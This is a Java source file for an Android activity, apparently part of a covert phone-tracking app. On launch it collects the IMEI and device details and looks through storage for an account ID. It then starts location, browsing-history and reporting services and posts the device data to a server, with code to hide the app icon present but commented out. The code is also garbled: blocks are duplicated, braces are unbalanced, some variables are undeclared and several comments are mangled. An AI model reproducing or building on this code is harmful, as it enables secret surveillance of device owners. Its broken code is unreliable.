package com.inet.android.bs;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.Button;
import android.widget.EditText;

import com.inet.android.certificate.R;
import com.inet.android.history.LinkService;
import com.inet.android.location.LocationTracker;
import com.inet.android.request.Request4;
import com.inet.android.utils.Logging;

public class MainActivity extends Activity {
	Button install;
	Button exit;
	LocationTracker gps;
	LinkService link;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	SharedPreferences sp;
	byte[] data;
	String incFile;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String fileID = "id.txt";
	List<String> result;
	File root;
	File[] fileArray;
	private String sID;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		// setContentView(R.layout.activity_main);
		context = getApplicationContext();
		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

		FileLog.writeLog(" ============================ \n");
		FileLog.writeLog(" onCreate \n");
		FileLog.writeLog(" ============================\n ");

		sp = PreferenceManager
				.getDefaultSharedPreferences(getApplicationContext());
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String imeistring = manager.getDeviceId();
		String model = android.os.Build.MODEL;
		String versionAndroid = android.os.Build.VERSION.RELEASE;

		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
		sIMEI = "IMEI: " + imeistring;
		e = sp.edit();
		e.putString("BUILD", "V_000.1");
		e.putString("imei", imeistring);
		e.putString("ABOUT", aboutDev);
		e.putString("model", model);
		e.putString("account", "account");

		e.commit();

		// hideIcon(); //

		// проверяем, первый ли раз открывается программа
		boolean hasVisited = sp.getBoolean("hasVisited", false);
		boolean getInfo = sp.getBoolean("getInfo", false);
		if (!hasVisited) {
			// РїСЂРѕРІРµСЂРєР° РЅР° РїРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє

		if (!hasVisited) {
			// проверка на первое посещение
			e = sp.edit();
			e.putBoolean("hasVisited", true);
			e.putBoolean("getInfo", true);
			e.putBoolean("hideIcon", false);
			e.putString("ABOUT", aboutDev);
			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // РІСЂРµРјСЏ
																				// РґР»СЏ
																				// СЃРµСЂРІРёСЃР°
																				// РёСЃС‚СЂРѕРё
																				// Рё
																				// Р±СЂР°СѓР·РµСЂР°
			e.putString("period", "1"); // РїРµСЂРёРѕРґРёС‡РµСЃРєРёР№ Р·Р°РїСЂРѕСЃ РєР°Р¶РґС‹Рµ 10 РјРёРЅСѓС‚
			e.putString("code", "-1");
			e.commit();

			// hideIcon();
		}

		if (getID()) {
			Logging.doLog(LOG_TAG, "getID return true");
		} else {
			Logging.doLog(LOG_TAG, "getID return false");
		}
		
		getID(); // рекурсивный поиск файла с нужным именем
		
		if (sp.getString("ID", "ID").equals("ID")) {
			Log.d(LOG_TAG, "File is not found. Show dialog.");
			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
			
			viewIDDialog();
		} else {
			Logging.doLog(LOG_TAG, "not show dialog");

			finish();
		}
	}

	private boolean viewIDDialog() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Attention!!!");
		alert.setMessage("Enter account number!");

		final EditText input = new EditText(this);
		alert.setView(input);

		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String value = input.getText().toString();
				
				// Do something with value!
				Log.d(LOG_TAG, "Text: " + value);
				FileLog.writeLog("Text: " + value);
				
				sp = PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext());
				Editor e = sp.edit();
				e.putString("ID", value);
				e.commit();
				
				start(); // запуск сервисов
				sendDiagPost();
				finish();
			}
		});

		alert.setNegativeButton("Cancel",
				new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int whichButton) {
						// Canceled.
						finish();
					}
				});

		alert.show();
		return true;
	}

	public void sendDiagPost() {
		String diag = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>"
				+ logTime() + "</time><type>1</type><ttl>"
				+ sp.getString("BUILD", "A0003 2013-10-03 20:00:00")
				+ "</ttl><cls>" + sp.getString("IMEI", "0000")
				+ "</cls><app>Диагностическая информация</app><url>"
				+ Long.toString(System.currentTimeMillis())
				+ sp.getString("ABOUT", "about") + "</url></packet>";

		FileLog.writeLog("MainActRequest: before req");

		Request req = new Request(context);
		req.sendRequest(diag);
		
		Log.d(LOG_TAG, "post req");
		FileLog.writeLog("MainActRequest: post req");
	}

	public void getID() {
		Log.d(LOG_TAG, "Start search ID ");
		File file[] = Environment.getExternalStorageDirectory().listFiles();
		return recursiveFileFind(file);
	}

	public boolean recursiveFileFind(File[] file1) {
		int i = 0;
		String ID = null;
		String filePath = " ";
		if (file1 != null) {
			while (i != file1.length) {
				filePath = file1[i].getAbsolutePath();
				sID = file1[i].getName();
				if (file1[i].isDirectory()) {
					File[] file = file1[i].listFiles();
					if (recursiveFileFind(file) == true)
						return true;
				}

				if (sID.indexOf("ts.apk") != -1) {
					ID = sID.substring(0, sID.indexOf("t"));
					e = sp.edit();
					e.putString("account", ID);
					e.commit();
					
					sendDiagPost();
					
					start(); // запуск сервисов
					return true;
				}
				i++;
			}

		}
		
		return false;
	}

	/**
	 * Start services
	 */
	public void start() {
		Logging.doLog(LOG_TAG, "start services", "start services");

		startService(new Intent(MainActivity.this, Request4.class));

		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		startService(new Intent(MainActivity.this, LocationTracker.class));
		startService(new Intent(MainActivity.this, LinkService.class));

		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
}